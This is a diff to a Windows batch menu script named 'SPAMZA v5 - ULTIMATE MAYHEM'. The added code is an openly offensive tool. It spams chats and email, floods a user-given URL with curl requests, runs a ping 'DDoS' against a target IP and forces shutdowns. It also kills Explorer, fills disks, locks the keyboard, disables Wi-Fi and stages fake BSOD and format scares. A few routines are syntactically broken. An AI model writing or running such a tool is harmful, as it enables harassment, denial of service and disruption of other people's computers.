@@ -6,7 +6,7 @@ mode con: cols=60 lines=35
 :menu
 cls
 echo ==========================================
-echo          SPAMZA v5 - ULTIMATE MAYHEM      
+echo          SPAMZA v5 - ULTIMATE MAYHEM
 echo ==========================================
 echo [1] Message spam (SendKeys)
 echo [2] API spam (GET/POST)
@@ -73,18 +73,200 @@ pause
 goto menu
 
 :: ==============================
-:: Auto-spam WhatsApp / Messenger
+:: Message Spam (SendKeys)
 :: ==============================
-:auto_spam
+:spam_msg
 cls
 set /p message=Enter message to spam:
 set /p count=Number of times:
-echo Place your cursor in the chat box...
+echo Place your cursor in the input field...
 timeout /t 5 >nul
 for /l %%i in (1,1,%count%) do (
     powershell -Command "$wshell = New-Object -ComObject WScript.Shell; $wshell.SendKeys('%message%{ENTER}')"
     timeout /t 1 >nul
 )
+goto menu
+
+:: ==============================
+:: API Spam (GET/POST)
+:: ==============================
+:spam_api
+cls
+set /p url=Enter the API URL to spam:
+set /p count=Number of requests:
+for /l %%i in (1,1,%count%) do (
+    curl -X GET %url%
+)
+goto menu
+
+:: ==============================
+:: CMD Window Spam (Infinite Mode)
+:: ==============================
+:spam_cmd
+cls
+echo This will open infinite command prompt windows.
+set /p count=How many windows do you want to open?:
+for /l %%i in (1,1,%count%) do (
+    start cmd
+)
+goto menu
+
+:: ==============================
+:: File Spam (Normal/Random)
+:: ==============================
+:spam_files
+cls
+set /p folder=Enter the folder path to spam:
+set /p count=Number of files to create:
+for /l %%i in (1,1,%count%) do (
+    echo SPAM > "%folder%\spam_%%i.txt"
+)
+goto menu
+
+:: ==============================
+:: Crash Windows Explorer
+:: ==============================
+:crash_explorer
+cls
+echo This will crash Windows Explorer.
+echo Are you sure? (Y/N):
+set /p choice=Choice:
+if /i "%choice%"=="Y" (
+    taskkill /f /im explorer.exe
+)
+goto menu
+
+:: ==============================
+:: Restart / Shutdown PC
+:: ==============================
+:power_options
+cls
+echo Restart or shutdown the PC?
+echo [1] Restart
+echo [2] Shutdown
+set /p choice=Choose an option:
+if "%choice%"=="1" shutdown /r /f /t 0
+if "%choice%"=="2" shutdown /s /f /t 0
+goto menu
+
+:: ==============================
+:: DDoS Attack (Ping flood)
+:: ==============================
+:ddos
+cls
+set /p ip=Enter target IP address:
+echo WARNING: This will flood the target with ping requests.
+set /p count=Number of pings:
+ping -n %count% %ip%
+goto menu
+
+:: ==============================
+:: RAM Crash (100% CPU)
+:: ==============================
+:crash_ram
+cls
+echo This will stress the CPU and RAM.
+echo Are you sure? (Y/N):
+set /p choice=Choice:
+if /i "%choice%"=="Y" (
+    start "" /b cmd /c "while (1) {echo Crash!}"
+)
+goto menu
+
+:: ==============================
+:: Windows Spam (Infinite Apps)
+:: ==============================
+:spam_windows
+cls
+echo WARNING: This will open many applications!
+set /p count=How many windows to open?:
+for /l %%i in (1,1,%count%) do (
+    start notepad
+)
+goto menu
+
+:: ==============================
+:: Fake Windows Update
+:: ==============================
+:fake_update
+cls
+echo Simulating a fake Windows update...
+echo 0% [#############################] 0%
+timeout /t 10 >nul
+echo 50% [##########################] 50%
+timeout /t 10 >nul
+echo 100% [########################] 100%
+timeout /t 5 >nul
+goto menu
+
+:: ==============================
+:: Fake Virus (BSOD)
+:: ==============================
+:fake_virus
+cls
+echo This will simulate a fake Blue Screen of Death (BSOD).
+timeout /t 5 >nul
+start "" "C:\Windows\System32\stop.bat"
+goto menu
+
+:: ==============================
+:: Email Spam (SMTP)
+:: ==============================
+:email_spam
+cls
+set /p email=Enter email to spam:
+set /p count=How many emails to send?:
+for /l %%i in (1,1,%count%) do (
+    echo "Subject: Spam" | sendmail /to %email% /subject "Spam" /message "This is a spam message."
+)
+goto menu
+
+:: ==============================
+:: Hard Drive Crash (Fill Storage)
+:: ==============================
+:hard_drive_crash
+cls
+set /p folder=Enter folder path to fill:
+set /p size=Enter size in MB to create:
+fsutil file createnew "%folder%\file.txt" %size%
+goto menu
+
+:: ==============================
+:: Fake Format (Scary Prank)
+:: ==============================
+:fake_format
+cls
+echo WARNING: Your hard drive will be formatted!
+timeout /t 5 >nul
+echo Simulating format...
+timeout /t 3 >nul
+goto menu
+
+:: ==============================
+:: Lock Keyboard (PowerShell)
+:: ==============================
+:lock_keyboard
+cls
+echo Locking keyboard...
+powershell -Command "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Keyboard{[DllImport(\"user32.dll\")] public static extern int BlockInput(bool block);}' -PassThru | [Keyboard]::BlockInput($true)"
+goto menu
+
+:: ==============================
+:: Crazy Mouse (PowerShell)
+:: ==============================
+:crazy_mouse
+cls
+echo Crazy mouse movement will start...
+powershell -Command "$wshell = New-Object -ComObject WScript.Shell; while ($true) { $wshell.SendKeys('{UP}'); $wshell.SendKeys('{DOWN}') }"
+goto menu
+
+:: ==============================
+:: Disable WiFi
+:: ==============================
+:disable_wifi
+cls
+echo Disabling WiFi...
+powershell -Command "(Get-NetAdapter -Name 'Wi-Fi').Disable()"
 goto menu
 
 :: ==============================
